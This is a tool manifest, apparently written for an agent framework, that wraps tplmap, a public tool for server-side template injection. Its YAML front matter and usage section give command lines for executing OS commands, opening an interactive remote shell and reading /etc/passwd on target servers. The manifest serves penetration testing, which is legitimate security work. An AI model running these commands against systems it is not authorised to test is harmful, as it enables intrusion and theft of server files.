---
id: security-web-tplmap
namespace: security:web:tplmap
name: tplmap
description: Server-Side Template Injection (SSTI) exploitation tool that automates detection and exploitation of template injection vulnerabilities across multiple template engines.
author: "Repository Maintainers"
version: "1.0.0"
capabilities:
  - web.ssti.detect
  - web.ssti.exploit
  - web.ssti.rce
  - web.ssti.read-file
  - web.ssti.sandbox-escape
platforms:
  - linux
  - macos
  - cross-platform
risk_level: high
trust_level: verified
execution_policy: enabled
architectures:
  - amd64
  - arm64
dependencies:
  - python3
related_tools:
  - commix
  - sqlmap
  - nmap
artifacts:
  - type: web.ssti.shell
    description: Remote shell access via SSTI
    mime: text/plain
    trust_level: verified
  - type: web.ssti.output
    description: Command execution output
    mime: text/plain
    trust_level: verified
workflow_edges:
  produces:
    - ssti-scan-results
    - remote-shell
  consumes:
    - target-url
    - inject-parameter
contract:
  inputs:
    - type: web.target.url
      description: Target URL with injection point
    - type: web.parameter.name
      description: Parameter name to inject
  outputs:
    - type: web.ssti.output
      description: Command output or file content
      mime: text/plain
    - type: web.ssti.shell
      description: Interactive shell session
      mime: text/plain
  side_effects:
    - network_traffic
  resource_cost:
    cpu: low
    memory_mb: 128
    network: low
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 128
  network: low
  disk_io: low
allowed-tools:
  - tplmap
  - python3
  - Bash
  - execFile
parameters:
  - name: url
    type: string
    required: true
    description: "Target URL"
    aliases:
      - -u
      - --url
  - name: flag-data
    type: string
    required: false
    description: "POST data string"
    aliases:
      - -d
      - --data
  - name: flag-cookie
    type: string
    required: false
    description: "HTTP Cookie header"
    aliases:
      - --cookie
  - name: flag-user-agent
    type: string
    required: false
    description: "Custom User-Agent header"
    aliases:
      - --user-agent
  - name: flag-header
    type: string
    required: false
    description: "Additional HTTP header"
    aliases:
      - -H
      - --header
  - name: flag-engine
    type: string
    required: false
    description: "Force template engine (smarty, twig, jinja2, etc.)"
    aliases:
      - --engine
  - name: flag-os-shell
    type: boolean
    required: false
    description: "Prompt for an interactive shell"
    aliases:
      - --os-shell
  - name: flag-os-cmd
    type: string
    required: false
    description: "Execute a single OS command"
    aliases:
      - --os-cmd
  - name: flag-read-file
    type: string
    required: false
    description: "Read a file from the server"
    aliases:
      - --read-file
  - name: flag-level
    type: integer
    required: false
    description: "Detection level (1-5)"
    aliases:
      - --level
  - name: flag-proxy
    type: string
    required: false
    description: "HTTP proxy"
    aliases:
      - --proxy
execution:
  template: "tplmap {flag-data} {flag-cookie} {flag-user-agent} {flag-header} {flag-engine} {flag-os-shell} {flag-os-cmd} {flag-read-file} {flag-level} {flag-proxy} -u {url}"
  sandbox: execFile
  timeout_seconds: 300
  shell: false
examples:
  - description: "Basic SSTI detection"
    command: tplmap -u "http://example.com/page?name=test"
  - description: "POST request with OS command execution"
    command: tplmap -u "http://example.com/submit" -d "name=test" --os-cmd "id"
  - description: "Interactive shell"
    command: tplmap -u "http://example.com/page?name=test" --os-shell
  - description: "Read file from server"
    command: tplmap -u "http://example.com/page?name=test" --read-file /etc/passwd
references:
  - label: "tplmap GitHub"
    url: "https://github.com/epinna/tplmap"
phase: exploitation
techniques:
  - execution
  - discovery
items:
  - Shell
  - NoCreds
services:
  - HTTP
attack_types:
  - Exploitation
  - Execution
install:
    - method: git
      repo_url: "https://github.com/epinna/tplmap.git"
      commands:
        - "git clone https://github.com/epinna/tplmap.git"
---

# Tplmap — Server-Side Template Injection Exploitation

tplmap is a Python-based tool for detecting and exploiting Server-Side Template Injection (SSTI) vulnerabilities. It supports multiple template engines including Jinja2, Twig, Smarty, Jade, Mako, and FreeMarker, enabling RCE, file reading, and sandbox escape.

## Usage

```bash
# Basic detection
tplmap -u "http://target.com/page?name=test"

# POST request
tplmap -u "http://target.com/submit" -d "name=test"

# Execute command
tplmap -u "http://target.com/page?name=test" --os-cmd "whoami"

# Interactive shell
tplmap -u "http://target.com/page?name=test" --os-shell

# Read file
tplmap -u "http://target.com/page?name=test" --read-file /etc/passwd
```
